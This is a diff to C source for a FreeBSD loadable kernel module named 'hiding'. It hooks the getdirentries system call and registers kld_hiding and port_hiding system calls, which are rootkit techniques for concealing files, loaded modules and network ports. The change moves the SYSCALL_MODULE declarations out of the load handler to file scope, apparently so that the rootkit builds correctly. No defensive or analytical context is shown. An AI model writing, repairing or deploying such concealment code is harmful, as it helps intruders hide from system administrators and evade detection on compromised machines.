@@ -178,12 +178,7 @@ load(struct module *module, int cmd, void *arg) {
 
     switch (cmd) {
     case MOD_LOAD: {
-        SYSCALL_MODULE(kld_hiding, &kld_hiding_offset, &kld_hiding_sysent, load, NULL);
-
         sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries_hook;
-
-        SYSCALL_MODULE(port_hiding, &port_hiding_offset, &port_hiding_sysent, load, NULL);
-
         break;
     }
     case MOD_UNLOAD:
@@ -204,3 +199,5 @@ static moduledata_t hiding_mod = {
 };
 
 DECLARE_MODULE(hiding, hiding_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+SYSCALL_MODULE(kld_hiding, &kld_hiding_offset, &kld_hiding_sysent, NULL, NULL);
+SYSCALL_MODULE(port_hiding, &port_hiding_offset, &port_hiding_sysent, NULL, NULL);
